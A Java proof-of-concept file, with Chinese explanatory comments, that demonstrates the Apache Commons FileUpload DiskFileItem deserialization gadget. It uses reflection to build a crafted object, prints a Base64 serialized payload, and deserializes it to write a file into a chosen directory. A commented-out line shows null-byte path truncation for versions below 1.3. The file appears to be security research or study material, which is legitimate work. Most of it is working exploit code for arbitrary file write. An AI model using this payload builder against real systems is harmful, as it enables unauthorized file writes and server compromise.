package Apache_Upload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

/**
 * FileItem 表示在 multipart/form-data POST 请求中接收到的文件或表单项
 * DiskFileItem 是 FileItem 的实现类，用来封装一个请求消息实体中的全部项目，在 FileUploadBase#parseRequest 解析时进行封装
 * 当上传的文件项目比较小时，直接保存在内存中（速度比较快），比较大时，以临时文件的形式，保存在磁盘临时文件夹。
 *
 * kick-off gadget：org.apache.commons.fileupload.disk.DiskFileItem#readObject()
 * sink gadget：org.apache.commons.fileupload.disk.DiskFileItem#getOutputStream()
 * chain gadget：org.apache.commons.beanutils.BeanComparator#compare()
 *
 * 几个 DiskFileItem 类中的属性：
 * repository：File 类型的成员变量，如果文件保存到硬盘上的话，保存的位置。
 * sizeThreshold：文件大小阈值，如果超过这个值，上传文件将会被储存在硬盘上。
 * fileName：原始文件名
 * dfos：一个 DeferredFileOutputStream 对象，用于 OutputStream 的写出
 * dfosFile：一个 File 对象，允许对其序列化的操作
 * DiskFileItem 重写了 readObject 方法实现了自己的逻辑,如果反序列化一个带数据的 DiskFileItem 类，就可能会触发文件的写出操作。
 *
 * DiskFileItem的序列化逻辑？
 * --通过dfos.isInMemory()方法判断文件内容是否在内存中，也就是通过判断 written 的长度和 threshold 阈值长度大小，如果写入大于阈值，则会被写出到文件中，那就不是存在内存中了
 * --如果在内存中，则会调用 dfos.getData() 方法获取存在 dfos 成员变量 memoryOutputStream 的 ByteArrayOutputStream 对象放在 cachedContent 中。
 * --如果不在内存中，则会将 cachedContent 置为空，然后将 dfosFile 赋值为 dfos 的成员变量 outputFile 对象。
 * --由于 dfos 是 transient 修饰的，不能被反序列化，所以能被反序列化的有 byte 数组类型的 cachedContent 和 File 对象的 dfosFile。
 *DiskFileItem反序列化逻辑？
 * --调用 getOutputStream() 方法获取 OutputStream 对象，实际上是 new 了一个 DeferredFileOutputStream 对象，文件路径使用 tempFile，如果为空使用 repository，如果还为空则使用 System.getProperty("java.io.tmpdir")，文件名使用 format("upload_%s_%s.tmp", UID, getUniqueId()) 生成随机的文件名。
 * --如果 cachedContent 不为空，则直接 write，否则将 dfosFile 文件内容拷贝到 OutputStream 中写出，并删除。
 *
 * DiskFileItem.readObject()
 *     DiskFileItem.getOutputStream()
 *             DeferredFileOutputStream.write()
 */
public class FileUploadForWrite {

    public static String fileName = "FileUploadForWrite.bin";

    public static void main(String[] args) throws Exception {

        // 创建文件写入目录 File 对象，以及文件写入内容
        String charset = "UTF-8";
        byte[] bytes   = "hahaha".getBytes(charset);

        // 在 1.3 版本以下，可以使用 \0 截断
        //File repository = new File("/Users/phoebe/Downloads/123.txt\0");

        // 在 1.3.1 及以上，只能指定目录
		File repository = new File("D:\\TestUpload");

        // 创建 dfos 对象
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

        // 使用 repository 初始化反序列化的 DiskFileItem 对象
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        // 序列化时 writeObject 要求 dfos 不能为 null
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);

        // 反射将 cachedContent 写入
        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem, bytes);

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(diskFileItem);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
